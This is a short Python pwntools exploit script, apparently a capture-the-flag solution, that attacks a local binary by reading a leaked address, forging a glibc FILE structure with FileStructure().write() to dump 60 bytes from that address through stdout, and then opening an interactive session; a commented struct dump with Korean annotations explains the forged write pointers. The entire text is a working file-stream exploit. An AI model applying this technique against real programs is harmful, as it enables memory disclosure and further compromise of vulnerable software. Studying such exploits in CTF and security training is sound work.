#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./a.out')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

p = process()

fp = FileStructure()
ru(b':')

secret = int(rl().strip(), 16)
slog("secret_mesage", secret)


pay = fp.write(secret, 60)

'''
{ flags: 0x800
 _IO_read_ptr: 0x0
 _IO_read_end: 0x5f1dc8604010
 _IO_read_base: 0x0
 _IO_write_base: 0x5f1dc8604010 < read_end == write_end, 쓸 곳의 주소
 _IO_write_ptr: 0x5f1dc860404c < 주소 + 크기
 _IO_write_end: 0x0
 _IO_buf_base: 0x0
 _IO_buf_end: 0x0
 _IO_save_base: 0x0
 _IO_backup_base: 0x0
 _IO_save_end: 0x0
 markers: 0x0
 chain: 0x0
 fileno: 0x1
 _flags2: 0x0
 _old_offset: 0xffffffffffffffff
 _cur_column: 0x0
 _vtable_offset: 0x0
 _shortbuf: 0x0
 unknown1: 0x0
 _lock: 0x0
 _offset: 0xffffffffffffffff
 _codecvt: 0x0
 _wide_data: 0x0
 unknown2: 0x0
 vtable: 0x0}
'''

print(fp)
s(pay)

p.interactive()